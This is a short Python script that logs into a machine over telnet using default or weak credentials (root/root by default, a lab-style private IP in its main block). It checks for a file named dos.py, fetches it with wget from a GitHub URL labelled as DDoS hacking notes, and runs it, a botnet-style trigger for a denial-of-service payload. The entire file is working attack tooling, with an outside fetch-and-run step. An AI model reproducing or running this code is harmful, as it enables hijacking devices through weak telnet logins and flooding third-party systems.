import telnetlib
import time
import re
class Trigger(object):
    def __init__(self):
        pass

    def login(self,Host,username=b'root',passwd=b'root'):
        dev = telnetlib.Telnet(Host,port=23)
        dev.set_debuglevel(2) #Debug mode

        dev.read_until(b'login:')
        dev.write(username + b'\n')

        dev.read_until(b'Password:')
        dev.write(passwd + b'\n')
        dev.read_until(b'$')
        return dev

    def checkIN(self,dev):
        fileisIN = False
        dev.write(b'ls'+b'\n')
        buff = dev.read_until(b'$')
        buff = str(buff,encoding='utf-8')
        matched = re.search(r'\bdos.py\b', buff, re.M)
        if matched:
            fileisIN = True
        return fileisIN

    def dosDownLoad(self,dev,path):
        dev.write(b'cd ~' + b'\n')

        dev.read_until(b'$')
        dev.write(b'wget '+ path + b'\n')
        dev.read_until(b'$')

    def dosAction(self,dev):
        dev.write(b'python3 dos.py' + b'\n')
        dev.read_until(b'$')

    def signout(self,dev):
        telnetlib.Telnet.close(dev)

if __name__ == '__main__':
    Host=b'192.168.59.146'
    username = b'gu'
    passwd = b'gu'
    path = b'https://raw.githubusercontent.com/isGt93/isGt93.github.io/source/source/_posts/%E9%BB%91%E5%AE%A2%E7%AC%94%E8%AE%B0-DDOS%E5%85%A5%E9%97%A8/dos.py'
    hack = Trigger()
    dev = hack.login(Host,username,passwd)
    if not hack.checkIN(dev):
        hack.dosDownLoad(dev,path)
    time.sleep(2)
    hack.dosAction(dev)
    hack.signout(dev)


